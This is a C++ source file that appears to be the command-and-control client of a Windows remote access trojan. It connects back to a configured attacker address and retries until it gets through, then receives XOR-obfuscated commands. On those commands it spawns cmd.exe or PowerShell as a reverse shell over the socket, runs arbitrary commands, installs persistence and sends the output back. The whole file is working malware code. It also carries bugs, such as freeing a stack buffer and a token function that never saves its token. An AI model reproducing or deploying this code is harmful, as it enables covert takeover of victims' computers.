#include "../inc/Connexion.h"
#include "../inc/common.h"
#include "../inc/Persistence.h"
#include "../inc/other.h"
#include "../inc/Exec.h"

#include <iostream>
#include <winsock2.h>
#include <windows.h> //sleep

using namespace std;

Connexion::Connexion()
{
    ;
} //Constructor
int Connexion::openConnexion() //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket
{     
    Sleep(500);

    WSADATA WSAData; 
    
    SOCKET sock;
    SOCKADDR_IN address_client;

//     SOCKADDR_IN address_client_tmp;
    sock_client = sock; //Find one alternativ
    cout <<"SOCKET: " <<sock << endl;
    //cout <<"after socket sock: " <<sock_client <<endl;

    WSAStartup(MAKEWORD(2,0), &WSAData);
    
    sock_client =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    //sock_client = socket(AF_INET, SOCK_STREAM, 0);
    cout <<"SOCK CREATE" <<endl;
    address_client.sin_addr.s_addr= inet_addr(IP_ADDRESS);
    address_client.sin_family = AF_INET;
    address_client.sin_port = htons(PORT);

    while(connect(sock_client,(SOCKADDR *)&address_client, sizeof(address_client)))
    {   
        Sleep(1000);
        cout << "Whait...." <<endl;  
    } 
    return 0;
}

int Connexion::main(bool is_admin, string path_prog)
{   

    int i=0;
    char buffer[BUFFER_LEN];
    string command;
    vector <string> result;

    int len_recv=0;    
    
    int cmpt;
    const int max_cmpt = TIMEOUT / MICRO_SLEEP;
    
    while(true)
    {
        //len_recv = recv(sock_client,buffer,sizeof(buffer), 0);
        //command.append(buffer,len_recv); 
        cout << "IN main client " << endl;
        Sleep(1000);
        
        command = recvSafe(i); //Recv safe and decrypt xor

        cout << "command in main ---->" << command <<"<------------"<<endl;
        cout << "command in main ---->" << command.length() <<"<------------"<<endl;

        if(command.find("is_life?") != string::npos)
        {
            cout << "is life find baby" << endl; // if find is_life then continue
        }
        else
        {
            //cout << "command in main ---->" << command.substr(0,command.length()-1) <<"<------------"<<endl;
            if(command=="exit")//change 
            {
                break;
            }
            else if (command.empty())
            {
                //Connection is down.
                cout << "NADA" << endl;
                //Beug ? 
            }
            else if(command.substr(0,2)=="cd")
            {
            ////cout << "Change directory" <<endl;
                if(changeDirectory(command))
                {
                    result.push_back("Error when changing folder.");
                }
                else
                {
                    result.push_back(getPath());   
                }
                //send(sock_client,result.c_str(),strlen(result.c_str()),0);
                sendSafe(result);
            }
            else if(command.substr(0,16) == "MOD_SPAWN_SHELL:")
            {   
                cout << "\n\n\nIN MOD SHELL " << endl;
                wchar_t prog[20];
                
                //test if cmd.exe or powershell.exe
                if(command.substr(16, command.length()) == "cmd.exe")
                {
                    wcscpy(prog, L"cmd.exe");
                    Exec().spawnSHELL(sock_client,prog);
                }

                else
                {      
                    wcscpy(prog, L"powershell.exe");
                    Exec().spawnSHELL(sock_client,prog);
                }

                free(prog);
            }
            else if(command.substr(0,8)=="MOD_ALL:")
            {
                Exec().executeCommand(command.substr(8,command.length()));
                
            }
            else if (command.substr(0,23) =="MOD_LONELY_PERSISTENCE:")  
            {
                //In mod persistence.
                cout << "MOD_PERSISTENCE \n\n\n" << endl;
                Persistence persistence(is_admin, path_prog);
                cout <<"STLEN OF  command.substr(23,command.length())" << command.substr(23,command.length()) << endl;
                
                if(command.substr(23,command.length()) =="default")
                {
                    cout << "Default persi" << endl;
                    persistence.main();
                    cout << "[+] Persi ok " << endl;
                }
                cout << "send " << endl;
                //FAUX sendSafe("\r\n"); //allows to send a confirmation to the server 
            }
            else
            {
                cout <<"exec gooo " << endl;
                result = Exec().executeCommand(command);
                if(command.substr(0,3) == "[-]")
                {;} //if error not append path.
                else
                {result.push_back(getPath());}
                
                sendSafe(result);
            }
        }
        cout << "ERASE ALL " << endl;
        command.erase();
        result.clear(); 
        i++;
    }
//        memset(buffer,0,sizeof(buffer));

    return 0;
}
string Connexion::recvSafe(int i)
{//allows you to receive data while managing errors 
    char buffer[BUFFER_LEN];
    string result;
    
    ZeroMemory(&buffer, strlen(buffer));

    int len_recv=recv(sock_client,buffer,sizeof(buffer),0);

    cout << "compteur: " << i <<endl;
    
    if(len_recv==SOCKET_ERROR)
    {
        cout <<"error in recvsafe, go to reconnect" <<endl;
        reConnect(); //?
        //return 1;
    }
    else
    {
        result.append(buffer,len_recv);
        cout << "COmmand: " << result << endl;
        cout << "strlen command: " << strlen(buffer) << endl;
        cout << "size command string " << result.size() << endl;
        //command.append(XORData);
        
        if(result.empty())
        {
            //If command empty re connect to server.
            cout << "[--]empty go to reconnect" <<endl;

            reConnect();
            return "";
        }
    }
    return XOREncryption(result);
}


void Connexion::sendSafe(vector<string> result_of_command)
{ /*send data and manage errors, also allows to segment the data if it is too big.
Once the function is finished send "\r\n" to signal to the server that the client has nothing more to send. */
    int iResult=0;

    int i=0;
    int size_all_result_of_command = 0;
    string end = "\r\n"; //END CONNECTION.
    string request = "";

    cout << "\n\n\n\n"  << endl;

    //nb_d_envoi -= 1; //NOT DELETE !!

    if(result_of_command.size() >= 1) 
    {        
        
        for(i=0;i< result_of_command.size(); i++)
        {
            cout << "Send request..." << endl;
            request = result_of_command[i];
            cout << "size request..." << request.length() << endl;
            
            send(sock_client, XOREncryption(request).c_str(), request.length(),0);
            cout << "send okkkkk" << endl;

            size_all_result_of_command += request.length();
            Sleep(100);
        }
    }

    else
    {
        request = result_of_command[0];

        iResult = send(sock_client, XOREncryption(request).c_str(), request.length(),0);
        checkSend(iResult);
        size_all_result_of_command += request.length();
    }
    
    cout << "NB ENVOI " << result_of_command.size() << endl;
    cout << size_all_result_of_command << endl;
    
    iResult=send(sock_client,XOREncryption(end).c_str(),2,0); // send end communication.
    checkSend(iResult);

    cout <<"STOP SEND" << endl;

}


void Connexion::checkSend(int &iResult)
{
    //Test if an error occurs when sending data 
    if(iResult == SOCKET_ERROR)
    {
        //cout << "error in sendSafe" << endl;
        cout << "Error in CheckSend go to reconnect:!" << endl;
        reConnect();
    }
}
void Connexion::closeConnexion()
{   
    // Can be made into a code system. ex:
    // If CODE01 == data then you delete the rat so everything is element.
    // Test if it should delete itself.
    // Test if he can connect several times to the server.
    // Test if it should wait after x second (s) to reconnect to the server.

    //"Close socket successful.
    cout << "LAST ERROR: " << WSAGetLastError() << endl; //https://docs.microsoft.com/en-us/windows/win32/winsock/disconnecting-the-client
    closesocket(sock_client);
    WSACleanup(); //The WSACleanup function terminates use of the Winsock 2 DLL (Ws2_32.dll).
    
    
}

void Connexion::reConnect()
{   
    string request;

    cout <<"\n\nRECONECTTTTTT" << endl;
    cout << "[+] Reconnect to server..." << endl;  
    //if the client has a token then reconnects without handshaking

    closeConnexion();

    openConnexion();
    
    cout << "\n\n[+] Send MOD_RECONNECT to server " << endl;
    request = ("MOD_RECONNECT" SPLIT  +a_token);
    cout << "REQ" << request << endl;

    sendUltraSafe(sock_client, XOREncryption(request)); //send token
    cout << "[+] Send tokken to server: "<< a_token  << endl;

    sendUltraSafe(sock_client, XOREncryption("\r\n"));
    cout << "Sendultrasafe sucess !!!" << endl;
   // system("PAUSE");
   cout <<"END RECONNECT\n\n" << endl;

}

int Connexion::getSocket()
{
    return sock_client;
}

void Connexion::setToken(string token)
{
    if(!token.empty())
    {
        a_token = token;
    }
    else
    {
        //if token is empty.
        char hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
        int i;

        srand(0); 

        for(i=0;i< 24 ;i++){token += hex_characters[rand()%16];}
        a_token;
    }
    
}